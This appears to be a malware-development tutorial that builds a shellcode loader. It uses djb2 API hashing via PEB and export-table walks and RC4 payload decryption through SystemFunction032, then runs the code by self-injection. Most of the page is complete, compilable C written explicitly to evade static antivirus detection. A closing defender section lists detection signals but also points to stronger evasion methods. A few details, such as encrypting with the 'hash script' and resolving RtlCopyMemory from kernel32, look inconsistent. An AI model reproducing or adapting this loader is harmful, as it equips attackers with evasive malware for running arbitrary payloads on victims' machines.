## Introduction
<p style="text-align: justify;"> T3 is still self injection under the hood — the shellcode runs inside our own process just like in T1. What changes is how we get there. T1 imported Win32 APIs by name and stored the shellcode in plaintext: two properties that make it trivially detectable by static analysis. T3 addresses both. The concept is: </p>
<strong><em>Resolve Win32 APIs at runtime using a hash function, decrypt an RC4-encrypted shellcode payload, then perform self injection</em></strong><br>
<p style="text-align: justify;"> This introduces two new ideas that underpin much of real-world malware:
<ul>
  <li><strong>API Hashing</strong> — instead of importing function names as strings (which appear in the IAT and are trivially signatured), we compute a hash of each function name and walk the PE export table at runtime to find a match. No string, no static signature.</li>
  <li><strong>Payload Encryption</strong> — the shellcode is stored RC4-encrypted. The raw bytes on disk match no known shellcode signature; the decryption only happens in memory at runtime.</li>
</ul>
</p>

## Flow
<p style="text-align: justify;"> At a high level, T3 follows these steps:
<ol>
  <li>Define the hash function and precompute target API hashes</li>
  <li>Find the base address of <code>kernel32.dll</code> from the PEB</li>
  <li>Walk the PE export table to resolve APIs by hash</li>
  <li>Decrypt the shellcode using RC4 via <code>SystemFunction032</code></li>
  <li>Allocate memory and copy the decrypted shellcode</li>
  <li>Execute the shellcode via a thread</li>
  <li>Wait for execution and clean up</li>
</ol></p>

#### 1. The hash function and precomputed hashes
<p style="text-align: justify;"> The hash function used here is a variant of <strong>djb2</strong> — a fast, simple algorithm that produces a stable 32-bit hash from a string:
</p>

```C
DWORD hash_function(char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    return hash;
}
```

<p style="text-align: justify;"> Before the binary is compiled, we run this function on the name of every API we need (<code>VirtualAlloc</code>, <code>RtlCopyMemory</code>, <code>CreateThread</code>, etc.) and embed the resulting integer constants directly into the code. These constants reveal nothing about which API they correspond to. The following Python snippet lets you compute them:
</p>

```python
def djb2(s):
    h = 5381
    for c in s:
        h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
    return hex(h)

print(djb2("VirtualAlloc"))
print(djb2("RtlCopyMemory"))
print(djb2("CreateThread"))
```

#### 2. Find kernel32.dll base address from the PEB
<p style="text-align: justify;"> Instead of calling <code>GetModuleHandle("kernel32.dll")</code> — which would leave a recognisable string in the binary — we read the base address directly from the <strong>Process Environment Block (PEB)</strong>. The PEB is a Windows-managed structure that lives at a well-known offset (<code>GS:[0x60]</code> on x64) and contains a loader data structure listing all modules currently mapped into the process. By walking the <code>InMemoryOrderModuleList</code> and comparing module names, we can find <code>kernel32.dll</code> without any string import. The structures below are not exposed in the standard headers, so we define them manually.</p>

```C
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOL       Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE           Reserved1[2];
    BYTE           BeingDebugged;
    BYTE           Reserved2[1];
    PVOID          Reserved3[2];
    PPEB_LDR_DATA  Ldr;
} PEB, *PPEB;
```

```C
PVOID get_module_base(LPCWSTR module_name) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *curr = head->Flink;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
            curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (_wcsicmp(entry->BaseDllName.Buffer, module_name) == 0)
            return entry->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}
```

#### 3. Walk the PE export table to resolve APIs by hash
<p style="text-align: justify;"> With the base address of <code>kernel32.dll</code> in hand, we parse its PE headers to reach the export directory. The export directory contains three parallel arrays: function names, ordinals, and function addresses. We hash every name in the names array and compare it against our precomputed target hash. When we find a match, we use the corresponding ordinal to look up the function address and return it. This gives us a valid function pointer — indistinguishable at runtime from one obtained via <code>GetProcAddress</code> — without any string in the binary.</p>

```C
PVOID resolve_api(PVOID base, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD*)((BYTE*)base + exports->AddressOfNames);
    WORD  *ords  = (WORD*) ((BYTE*)base + exports->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)((BYTE*)base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *name = (char*)((BYTE*)base + names[i]);
        if (hash_function(name) == target_hash)
            return (PVOID)((BYTE*)base + funcs[ords[i]]);
    }
    return NULL;
}
```

#### 4. Decrypt shellcode using RC4 via SystemFunction032
<p style="text-align: justify;"> Rather than implementing RC4 from scratch, we use <code>SystemFunction032</code> — an undocumented function exported by <code>Advapi32.dll</code> that performs in-place RC4 encryption and decryption (RC4 is symmetric, so the same call both encrypts and decrypts). The reason to use it instead of a hand-rolled RC4 loop is pragmatic: <code>Advapi32.dll</code> is loaded in virtually every Windows process by default, so calling it adds no new imports to the binary. It takes two <code>USTRING</code> structures — one for the data and one for the key — and modifies the data buffer in place.</p>

```C
typedef struct {
    DWORD  Length;
    DWORD  MaximumLength;
    PUCHAR Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *SystemFunction032_t)(USTRING *data, USTRING *key);

// Decrypt in place
USTRING data_str = { sizeof(enc_shellcode), sizeof(enc_shellcode), (PUCHAR)enc_shellcode };
USTRING key_str  = { sizeof(rc4_key) - 1,  sizeof(rc4_key) - 1,  (PUCHAR)rc4_key       };

SystemFunction032_t pSystemFunction032 = (SystemFunction032_t)
    GetProcAddress(LoadLibraryA("Advapi32.dll"), "SystemFunction032");
pSystemFunction032(&data_str, &key_str);
```

#### 5 – 7. Allocate, write, execute, and clean up
<p style="text-align: justify;"> Once the shellcode is decrypted in memory, steps 5 through 7 are identical to T1: <code>VirtualAlloc</code> reserves a RWX page, <code>RtlCopyMemory</code> moves the plaintext shellcode into it, and <code>CreateThread</code> points a new thread at the shellcode's start address. We wait with <code>WaitForSingleObject</code>, then free and close handles. The key difference is that all of these API calls are made through the function pointers resolved in step 3 — the binary never contains the strings <code>"VirtualAlloc"</code> or <code>"CreateThread"</code>.</p>

```
+------------------------------+
|  Precomputed API Hash Values |
|  (no strings in the binary)  |
+------------------------------+
             |
             v
+------------------------------+
|   PEB Walk                   |
|   (Find kernel32.dll base)   |
+------------------------------+
             |
             v
+------------------------------+
|   Export Table Walk          |
|   (Resolve APIs by hash)     |
+------------------------------+
             |
             v
+------------------------------+
|   SystemFunction032 (RC4)    |
|   (Decrypt shellcode in mem) |
+------------------------------+
             |
             v
+------------------------------+
|   VirtualAlloc               |
|   (RWX Memory Page)          |
+------------------------------+
             |
             v
+------------------------------+
|   RtlCopyMemory              |
|   (Decrypted Shellcode -> Mem)|
+------------------------------+
             |
             v
+------------------------------+
|   CreateThread               |
|   (Shellcode Entry Point)    |
+------------------------------+
             |
             v
+------------------------------+
|   Cleanup (Wait / Free)      |
+------------------------------+
```

## Full Code
> The shellcode below must be RC4-encrypted before embedding. Generate the ciphertext by running the hash script against the key `"Yere is oUr Key"` and replace the `enc_shellcode` array with the output. Full source is also available on [GitHub](https://github.com/gil01karougbe/maldev/blob/main/Techniques/t3.c).

```C
/*
    T3: API Hashing with Local Process Injection
    Target Process: Self
    Payload Enc: RC4 (SystemFunction032)
    Payload Obs: API Hashing (djb2)
*/

#include <windows.h>
#include <stdio.h>
#include <ntstatus.h>

// ---- PEB / LDR Structures ----
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOL       Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE          Reserved1[2];
    BYTE          BeingDebugged;
    BYTE          Reserved2[1];
    PVOID         Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// ---- RC4 / SystemFunction032 ----
typedef struct {
    DWORD  Length;
    DWORD  MaximumLength;
    PUCHAR Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *SystemFunction032_t)(USTRING *data, USTRING *key);

// ---- Hash Function (djb2 variant) ----
DWORD hash_function(char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// ---- Find module base via PEB walk ----
PVOID get_module_base(LPCWSTR module_name) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *curr = head->Flink;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
            curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer &&
            _wcsicmp(entry->BaseDllName.Buffer, module_name) == 0)
            return entry->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

// ---- Resolve API by walking the PE export table ----
PVOID resolve_api(PVOID base, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD*)((BYTE*)base + exports->AddressOfNames);
    WORD  *ords  = (WORD*) ((BYTE*)base + exports->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)((BYTE*)base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *name = (char*)((BYTE*)base + names[i]);
        if (hash_function(name) == target_hash)
            return (PVOID)((BYTE*)base + funcs[ords[i]]);
    }
    return NULL;
}

// ---- RC4-encrypted calc.exe shellcode (key: "Yere is oUr Key") ----
// Generate with: python3 encrypt.py shellcode.bin "Yere is oUr Key"
unsigned char enc_shellcode[] = { /* encrypted bytes here */ };
const char rc4_key[] = "Yere is oUr Key";

int main() {
    // Resolve Kernel32 APIs via hash
    PVOID k32 = get_module_base(L"KERNEL32.DLL");
    if (!k32) return EXIT_FAILURE;

    // Precomputed hashes — run djb2() on each API name to generate
    typedef LPVOID  (WINAPI *VirtualAlloc_t)   (LPVOID, SIZE_T, DWORD, DWORD);
    typedef VOID    (WINAPI *RtlCopyMemory_t)  (PVOID, const VOID*, SIZE_T);
    typedef HANDLE  (WINAPI *CreateThread_t)   (LPSECURITY_ATTRIBUTES, SIZE_T,
                                                LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef DWORD   (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
    typedef BOOL    (WINAPI *VirtualFree_t)    (LPVOID, SIZE_T, DWORD);
    typedef BOOL    (WINAPI *CloseHandle_t)    (HANDLE);

    VirtualAlloc_t        pVirtualAlloc        = (VirtualAlloc_t)       resolve_api(k32, hash_function("VirtualAlloc"));
    RtlCopyMemory_t       pRtlCopyMemory       = (RtlCopyMemory_t)      resolve_api(k32, hash_function("RtlCopyMemory"));
    CreateThread_t        pCreateThread        = (CreateThread_t)       resolve_api(k32, hash_function("CreateThread"));
    WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t)resolve_api(k32, hash_function("WaitForSingleObject"));
    VirtualFree_t         pVirtualFree         = (VirtualFree_t)        resolve_api(k32, hash_function("VirtualFree"));
    CloseHandle_t         pCloseHandle         = (CloseHandle_t)        resolve_api(k32, hash_function("CloseHandle"));

    // Decrypt shellcode in place using SystemFunction032 (RC4)
    SystemFunction032_t pSystemFunction032 = (SystemFunction032_t)
        GetProcAddress(LoadLibraryA("Advapi32.dll"), "SystemFunction032");

    USTRING data_str = { sizeof(enc_shellcode), sizeof(enc_shellcode), (PUCHAR)enc_shellcode };
    USTRING key_str  = { sizeof(rc4_key) - 1,   sizeof(rc4_key) - 1,  (PUCHAR)rc4_key       };
    pSystemFunction032(&data_str, &key_str);

    // Self-injection (same flow as T1, via resolved pointers)
    LPVOID mem_allocated = pVirtualAlloc(NULL, sizeof(enc_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem_allocated) return EXIT_FAILURE;
    printf("Memory page allocated at: 0x%p\n", mem_allocated);

    pRtlCopyMemory(mem_allocated, enc_shellcode, sizeof(enc_shellcode));

    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem_allocated, NULL, 0, NULL);
    if (!hThread) return EXIT_FAILURE;

    pWaitForSingleObject(hThread, INFINITE);
    pCloseHandle(hThread);
    pVirtualFree(mem_allocated, 0, MEM_RELEASE);

    return EXIT_SUCCESS;
}
```

## Detection Perspective (Blue Team Insight)
<p style="text-align: justify;">
T3 defeats the most obvious static analysis signals from T1, but it introduces new behavioural patterns that defenders can still catch.
</p>

<p style="text-align: justify;">
<strong>1. Absence of expected imports.</strong> A binary that calls <code>VirtualAlloc</code> and <code>CreateThread</code> with no corresponding entries in its Import Address Table is anomalous. Static analysis tools and AV scanners can flag this "suspicious import absence" as strongly as they flag the presence of known-bad strings. It is a double-edged sword.
</p>

<p style="text-align: justify;">
<strong>2. PEB walking at runtime.</strong> Reading the PEB to enumerate loaded modules is a well-known malware behaviour. Userland EDR hooks on <code>ntdll</code> or kernel callbacks on <code>PsLoadedModuleList</code> access can observe this pattern. It shows up clearly in memory traces and API call graphs.
</p>

<p style="text-align: justify;">
<strong>3. RC4 decryption in memory.</strong> Even though the shellcode on disk is encrypted, a memory scanner can catch the plaintext bytes the moment they are decrypted into the allocated page. Products like Windows Defender's Antimalware Scan Interface (AMSI) or CrowdStrike's memory scanner continuously inspect newly executable memory regions for known shellcode patterns. The shellcode is only "hidden" until it lands in memory.
</p>

<p style="text-align: justify;">
<strong>4. RWX allocation.</strong> As in T1, the RWX page remains a strong signal. The RW → VirtualProtect → RX approach applies here too. Better yet, techniques like module stomping or process hollowing avoid allocating new executable memory entirely.
</p>
